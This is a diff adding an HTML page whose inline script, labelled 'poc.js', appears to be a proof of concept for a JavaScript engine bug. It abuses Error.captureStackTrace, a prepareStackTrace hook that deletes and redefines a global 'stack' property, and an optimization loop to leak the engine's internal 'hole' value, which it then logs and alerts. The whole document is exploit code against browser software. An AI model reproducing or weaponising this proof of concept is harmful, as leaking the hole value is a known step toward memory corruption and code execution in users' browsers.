@@ -1,0 +1,26 @@
+<html>
+
+  <script>
+    /* poc.js */
+
+function load_stack() {
+    let a = stack;
+    return a;
+}
+
+Error.captureStackTrace(globalThis);
+Error.prepareStackTrace = () => {
+    delete stack;
+    Object.defineProperty(globalThis, 'stack', { value: 1, writable: true }); // configurable: false
+    stack = {}; // cell_type == kMutable
+    for (let i = 0; i < 0x10000; i++) { load_stack(); } // optimization
+}
+
+Object.defineProperty(globalThis, 'stack', { value: 1, configurable: true });
+delete stack;
+let hole = load_stack(); // the_hole
+
+console.log(hole);
+  alert(hole);
+  </script>
+</html>
